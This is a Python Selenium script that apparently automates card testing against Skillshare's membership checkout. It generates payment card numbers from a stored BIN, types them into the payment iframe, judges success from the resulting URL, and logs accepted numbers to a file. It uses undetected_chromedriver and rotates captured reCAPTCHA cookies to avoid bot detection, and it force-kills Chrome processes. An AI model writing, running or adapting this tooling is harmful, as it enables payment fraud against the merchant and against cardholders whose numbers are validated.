
from pathlib import Path
import pickle
import undetected_chromedriver as uc
import time ,os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
import os, datetime,sys
import calendar
# import time
# sys.path.append('/my_mod/')
from my_mod import chrom_v1 
from my_mod import bin00




kol=[]
error_log=[]
cardi_number=[]

def ccchec():
    os.system("ps aux | grep -i chrome | awk '{print $2}'|xargs kill -9 > /dev/null 2>&1")
    path_to_file = 'skill_cookies.pkl'
    path = Path(path_to_file)
    if path.is_file():

        print(f'The file {path_to_file} exists')
        start_session()
    else:
        print(f'The file {path_to_file} does not exist')
        os.system("pt recaptcha_cookies_skills_capture.py")
        ccchec()



def my_log_error(error_string):
    print("ADDING ERROR : |E| "+error_string)
    error_log.append(error_string)
    print(error_string)

def generate_bin():
    print("generate bin")

def bin_operation():
    os.system("clear")
    print("------------------------------------------------------------------")
    print(" _GET THE LAST BIN ",end='',flush=True)
    arry_card_all_info=[]
    the_last_bin=bin00.read_the_last_bin()
    print(" _LAST BIN : [  "+the_last_bin+"  ]")
    cardi_number.append(the_last_bin)
    arry_card_bin_info=bin00.generate_card_from_bin(the_last_bin)
    return arry_card_bin_info

def my_switch_to_iframe_1(browser,kol):
    browser.switch_to.default_content()
    print("my_switch_to_iframe  2 ")
    time.sleep(2)
    browser.switch_to.frame(1)
    # time.sleep(5)
    try:
        singup_green_button=WebDriverWait(browser, 5).until(EC.presence_of_element_located((By.ID, 'Field-numberInput')))
        singup_green_button.send_keys(kol[0],Keys.TAB,kol[1],Keys.TAB,kol[2])
        print("FILLING ALL ")
        # input("")
    except Exception as e:
        error_switch= str(e)
        my_log_error(error_switch)
        pass

def my_switch_to_iframe(browser,kol):
    browser.switch_to.default_content()
    print("my_switch_to_iframe  1 ")
    time.sleep(2)
    browser.switch_to.frame(0)
    # time.sleep(5)
    try:
        singup_green_button=WebDriverWait(browser, 5).until(EC.presence_of_element_located((By.ID, 'Field-numberInput')))
        singup_green_button.send_keys(kol[0],Keys.TAB,kol[1],Keys.TAB,kol[2])
        print("FILLING ALL my_switch_to_iframe  1 ")
        # input("")
    except Exception as e:
        my_switch_to_iframe_1(browser,kol)
        # print(str(e))

def save_successed_bin(card_numer):
    # l_bin=read_the_last_bin()
    print(card_numer)
    # new_bin=int(l_bin)+1
    # binani=str(new_bin)
    #################
    with open("succed_bin","a") as file_bin:
        file_bin.write(cardi_number[0]+" "+card_numer+"\n")
    
    del cardi_number[:]

def my_rmove_old_coockies():
    ts = calendar.timegm(time.gmtime())
    print(ts)
    # "Hey, %s!" 
    new_name_coocki=str(ts)+"-x.pkl"
    comad="mv skill_cookies.pkl %s! "% new_name_coocki
    print(comad)
    os.system(comad)
    # skill_cookies.pkl


def check_home(browser):
    # curent_url=browser.curent_url()
    # os.system("pt recaptcha_cookies_skills_capture.py")
    get_url = browser.current_url
    print(get_url)
    if "home" in get_url:
        browser.delete_all_cookies()
        print("delete_all_cookies")
        browser.close()
        print("close browser")
        my_rmove_old_coockies()
        os.system("pt recaptcha_cookies_skills_capture.py")
        print("NEW Coockies !!")
        start_session()


def check_suuced(browser,full):
    get_url = browser.current_url
    print(get_url)
    if "home" in get_url:
        os.system("cat last_bin >> suss_bin")
        # input("suuuuuuuuuuuuuuuuuuuuuuuuuuuuuu")
        save_successed_bin(full)
        print("succed !!!!!!!!!!!!")
        bin00.add_to_last_bin()
        browser.close()
        os.system("rm skill_cookies.pkl")
        # browser.close()
        # check_home(browser)
        ccchec()
    if "checkout" in get_url:
        bin00.add_to_last_bin()
        browser.close()
        start_session()






def go_fill(browser):
    arry_card_bin_info=bin_operation()
    kol=arry_card_bin_info
    full=kol[0]+" "+kol[1]+" "+kol[2]
    my_switch_to_iframe(browser,kol)
    browser.switch_to.default_content()
    try:
        singup_green_button=WebDriverWait(browser, 2).until(EC.presence_of_element_located((By.XPATH, '//*[@id="react-checkout"]/div/div[1]/form/div[2]/div[2]/div[2]/div[2]/div/button')))
        print("Start Subscribing")
        singup_green_button.click()


    except Exception as e:
        error_msg=str(e)
        print("go_fill error")


    try:
        singup_green_button=WebDriverWait(browser, 20).until(EC.presence_of_element_located((By.XPATH, '//*[@id="react-checkout"]/div/div[1]/form/div[1]/div/div[2]/div[1]/div/div[1]/div/p')))
        print("ilad : "+singup_green_button.text)
        bin00.add_to_last_bin()
        browser.get("https://www.skillshare.com/en/membership/checkout")
        # input("gggg")
        go_fill(browser)
    except Exception as e:
        print("sssssssssssssssssss")
        check_suuced(browser,full)


        # break

def check_pay(browser):

    iframes = browser.find_elements_by_xpath("//iframe")
    browser.switch_to.default_content()
    go_fill(browser)

def remove_coockies(browser):
    print("remove_coockies button")
    try:

        preform_one=WebDriverWait(browser, 15).until(EC.presence_of_element_located((By.ID, 'checkout-variant-1')))
        print("llll")
        preform_one.click()
        preform_one.send_keys(Keys.TAB*10,Keys.SPACE)
        print("coockie accepted")
    except Exception as e:
        print("hhhhhhhhhh"+str(e))

def start_session():
    browser=chrom_v1.chrome_session()
    browser.get('https://www.skillshare.com')
    cookies = pickle.load(open("skill_cookies.pkl", "rb"))
    for cookie in cookies:
        cookie['domain'] = ".skillshare.com"
        
        try:
            browser.add_cookie(cookie)
        except Exception as e:
            # print(str(e))
            pass

    browser.get('https://www.skillshare.com/')


    # time.sleep(120)
    print("runn_ing")
    check_home(browser)
    try:
        remove_coockies(browser)
    except :
        print("no ccccccc")
    check_pay(browser)
    # input("gfg")
#--------------------------------------------

if __name__ == '__main__':

    try:
        ccchec()
        # start_session()
    except Exception as a:
        print("error in main"+str(a))
    # os.system("pkill chrome")
